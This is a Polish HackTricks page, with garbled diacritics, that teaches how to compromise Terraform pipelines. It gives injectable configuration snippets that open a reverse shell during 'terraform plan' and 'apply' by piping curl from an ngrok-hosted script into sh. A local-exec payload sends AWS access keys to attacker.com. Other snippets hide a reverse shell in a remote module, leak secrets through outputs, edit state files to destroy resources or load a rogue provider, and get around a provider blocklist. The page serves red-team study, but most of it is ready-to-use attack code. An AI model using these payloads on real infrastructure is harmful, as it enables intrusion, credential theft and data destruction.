# Bezpieczestwo Terraforma

<details>

<summary><strong>Zacznij od zera i sta si ekspertem od hakowania AWS dziki</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** mnie na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>

## Podstawowe informacje

[Z dokumentacji:](https://developer.hashicorp.com/terraform/intro)

HashiCorp Terraform to narzdzie **infrastruktury jako kodu**, kt贸re pozwala zdefiniowa zar贸wno **zasoby chmurowe, jak i zasoby lokalne** w czytelnych dla czowieka plikach konfiguracyjnych, kt贸re mo偶na wersjonowa, ponownie u偶ywa i udostpnia. Nastpnie mo偶esz u偶y sp贸jnego procesu roboczego do wdra偶ania i zarzdzania caym swoim rodowiskiem infrastruktury. Terraform mo偶e zarzdza komponentami niskiego poziomu, takimi jak obliczenia, przechowywanie i zasoby sieciowe, a tak偶e komponentami wysokiego poziomu, takimi jak wpisy DNS i funkcje SaaS.

### Jak dziaa Terraform?

Terraform tworzy i zarzdza zasobami na platformach chmurowych i innych usugach za pomoc interfejs贸w programowania aplikacji (API). Dostawcy umo偶liwiaj Terraformowi wsp贸prac z praktycznie dowoln platform lub usug z dostpnym interfejsem API.

![](<../.gitbook/assets/image (177).png>)

HashiCorp i spoeczno Terraformu napisali ju偶 **ponad 1700 dostawc贸w**, aby zarzdza tysicami r贸偶nych typ贸w zasob贸w i usug, a ta liczba cigle ronie. Wszystkie publicznie dostpne dostawcy mo偶na znale藕 w [Rejestrze Terraform](https://registry.terraform.io/), w tym Amazon Web Services (AWS), Azure, Google Cloud Platform (GCP), Kubernetes, Helm, GitHub, Splunk, DataDog i wiele innych.

Podstawowy proces roboczy Terraformu skada si z trzech etap贸w:

* **Napisz:** Definiujesz zasoby, kt贸re mog by rozproszone na wielu dostawcach chmurowych i usugach. Na przykad mo偶esz utworzy konfiguracj do wdro偶enia aplikacji na maszynach wirtualnych w sieci Virtual Private Cloud (VPC) z grupami zabezpiecze i r贸wnowa偶nikiem obci偶enia.
* **Plan:** Terraform tworzy plan wykonania opisujcy infrastruktur, kt贸r utworzy, zaktualizuje lub zniszczy na podstawie istniejcej infrastruktury i twojej konfiguracji.
* **Zastosuj:** Po zatwierdzeniu Terraform wykonuje proponowane operacje w odpowiedniej kolejnoci, szanujc zale偶noci zasob贸w. Na przykad, jeli zaktualizujesz waciwoci VPC i zmienisz liczb maszyn wirtualnych w tym VPC, Terraform najpierw odtworzy VPC, a nastpnie skaluje maszyny wirtualne.

![](<../.gitbook/assets/image (215).png>)

## Laboratorium Terraform

Po prostu zainstaluj Terraform na swoim komputerze.

Tutaj masz [przewodnik](https://learn.hashicorp.com/tutorials/terraform/install-cli) i tutaj masz [najlepszy spos贸b na pobranie Terraforma](https://www.terraform.io/downloads).

## RCE w Terraform

Terraform **nie ma platformy eksponujcej stron internetow ani usug sieciow**, kt贸r mo偶na by wyliczy, dlatego jedynym sposobem skompromitowania Terraforma jest **mo偶liwo dodania/modyfikacji plik贸w konfiguracyjnych Terraforma**.

Jednak Terraform to **bardzo wra偶liwy komponent** do skompromitowania, poniewa偶 bdzie mia **uprzywilejowany dostp** do r贸偶nych lokalizacji, aby m贸c poprawnie dziaa.

G贸wnym sposobem dla atakujcego na skompromitowanie systemu, na kt贸rym dziaa Terraform, jest **skompromitowanie repozytorium przechowujcego konfiguracje Terraforma**, poniewa偶 w pewnym momencie zostan one **zinterpretowane**.

Faktycznie istniej rozwizania, kt贸re **automatycznie wykonuj plan/apply Terraforma po utworzeniu PR**, takie jak **Atlantis**:

{% content-ref url="atlantis-security.md" %}
[atlantis-security.md](atlantis-security.md)
{% endcontent-ref %}

Jeli uda ci si skompromitowa plik Terraforma, istniej r贸偶ne sposoby wykonania RCE, gdy kto wykonuje `terraform plan` lub `terraform apply`.

### Plan Terraforma

Plan Terraforma to **najczciej u偶ywane polecenie** w Terraformie, a programici/rozwizania korzystajce z Terraforma czsto je wywouj, dlatego **najatwiejszym sposobem na uzyskanie RCE** jest upewnienie si, 偶e zatrujesz plik konfiguracyjny Terraforma, kt贸ry bdzie wykonywa dowolne polecenia w `terraform plan`.

#### U偶ycie dostawcy zewntrznego

Terraform oferuje dostawc [`external`](https://registry.terraform.io/providers/hashicorp/external/latest/docs), kt贸ry zapewnia spos贸b interfejsu midzy Terraformem a programami zewntrznymi. Mo偶esz u偶y 藕r贸da danych `external`, aby uruchamia dowolny kod podczas `planu`.

Wstrzyknicie czego takiego jak poni偶ej do pliku konfiguracyjnego Terraforma spowoduje wykonanie powoki rev podczas wykonywania `terraform plan`:
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
#### U偶ycie niestandardowego dostawcy

Atakujcy m贸gby przesa [niestandardowego dostawc](https://learn.hashicorp.com/tutorials/terraform/provider-setup) do [Rejestru Terraforma](https://registry.terraform.io/) a nastpnie doda go do kodu Terraforma w gazi funkcji ([przykad std](https://alex.kaskaso.li/post/terraform-plan-rce)):
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
Dostawca jest pobierany w `init` i uruchomi zoliwy kod podczas wykonywania `plan`

Przykad mo偶na znale藕 pod adresem [https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec)

#### Korzystanie z zewntrznego odwoania

Obie wymienione opcje s przydatne, ale niezbyt skryte (druga jest bardziej skryta, ale bardziej skomplikowana ni偶 pierwsza). Mo偶esz przeprowadzi ten atak nawet w **bardziej skryty spos贸b**, postpujc zgodnie z tymi sugestiami:

* Zamiast dodawa rev shell bezporednio do pliku terraform, mo偶esz **zaadowa zewntrzny zas贸b**, kt贸ry zawiera rev shell:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
Mo偶esz znale藕 kod rev shell w [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules)

* W zewntrznym zasobie u偶yj funkcji **ref** aby ukry **kod rev shell Terraforma w gazi** wewntrz repozytorium, co w stylu: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

### Zastosowanie Terraforma

Zastosowanie Terraforma zostanie wykonane, aby zastosowa wszystkie zmiany, mo偶na r贸wnie偶 nadu偶y go do uzyskania RCE poprzez wstrzyknicie **zoliwego pliku Terraforma za pomoc** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
Wystarczy upewni si, 偶e pewny adunek, taki jak poni偶sze, znajduje si w pliku `main.tf`:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
Pod偶aj za **sugestiami z poprzedniej techniki**, aby przeprowadzi ten atak w **bardziej skrytym spos贸b, korzystajc z zewntrznych odwoa**.

## Wycieki Sekret贸w

Mo偶esz mie **wartoci sekretne u偶ywane przez terraform wyciekajce** uruchamiajc `terraform apply`, dodajc co w rodzaju do pliku terraform:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
## Nadu偶ywanie plik贸w stanu Terraforma

W przypadku posiadania uprawnie do zapisu plik贸w stanu Terraforma, ale braku mo偶liwoci zmiany kodu Terraforma, [**to badanie**](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/) przedstawia kilka interesujcych opcji wykorzystania pliku:

### Usuwanie zasob贸w <a href="#deleting-resources" id="deleting-resources"></a>

Istniej 2 sposoby usuwania zasob贸w:

1. **Wstawienie zasobu o losowej nazwie do pliku stanu wskazujcego na rzeczywisty zas贸b do usunicia**

Poniewa偶 Terraform zauwa偶y, 偶e zas贸b nie powinien istnie, usunie go (zgodnie z wskazanym rzeczywistym identyfikatorem zasobu). Przykad z poprzedniej strony:
```json
{
"mode": "managed",
"type": "aws_instance",
"name": "example",
"provider": "provider[\"registry.terraform.io/hashicorp/aws\"]",
"instances": [
{
"attributes": {
"id": "i-1234567890abcdefg"
}
}
]
},
```
2. **Zmodyfikuj zas贸b do usunicia w taki spos贸b, 偶e nie bdzie mo偶liwe jego zaktualizowanie (zostanie usunity i odtworzony)**

Dla instancji EC2 wystarczy zmieni typ instancji, aby terraform usun j i odtworzy.

### RCE

Mo偶liwe jest r贸wnie偶 [utworzenie niestandardowego dostawcy](https://developer.hashicorp.com/terraform/tutorials/providers-plugin-framework/providers-plugin-framework-provider) i po prostu zastpienie jednego z dostawc贸w w pliku stanu terraform szkodliwym lub dodanie pustego zasobu z szkodliwym dostawc. Przykad z oryginalnych bada:
```json
"resources": [
{
"mode": "managed",
"type": "scaffolding_example",
"name": "example",
"provider": "provider[\"registry.terraform.io/dagrz/terrarizer\"]",
"instances": [

]
},
```
## Zastp zablokowanego dostawc

W przypadku napotkania sytuacji, w kt贸rej `hashicorp/external` zosta umieszczony na czarnej licie, mo偶esz ponownie zaimplementowa dostawc `external`, wykonujc nastpujce kroki. Uwaga: U偶ywamy forka dostawcy external opublikowanego przez https://registry.terraform.io/providers/nazarewk/external/latest. Mo偶esz r贸wnie偶 opublikowa wasny fork lub ponown implementacj.
```terraform
terraform {
required_providers {
external = {
source  = "nazarewk/external"
version = "3.0.0"
}
}
}
```
W takim przypadku mo偶esz u偶y `external` jak zwykle.
```terraform
data "external" "example" {
program = ["sh", "-c", "whoami"]
}
```
## Narzdzia audytowe

* [**tfsec**](https://github.com/aquasecurity/tfsec): tfsec wykorzystuje statyczn analiz kodu terraforma do wykrywania potencjalnych bd贸w konfiguracyjnych.
* [**terascan**](https://github.com/tenable/terrascan): Terrascan to statyczny analizator kodu dla infrastruktury jako kodu.

## Odnoniki

* [Atlantis Security](atlantis-security.md)
* [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)
* [https://developer.hashicorp.com/terraform/intro](https://developer.hashicorp.com/terraform/intro)
* [https://blog.plerion.com/hacking-terraform-state-privilege-escalation/](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/)

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** mnie na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si swoimi sztuczkami hakowania, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na githubie.

</details>
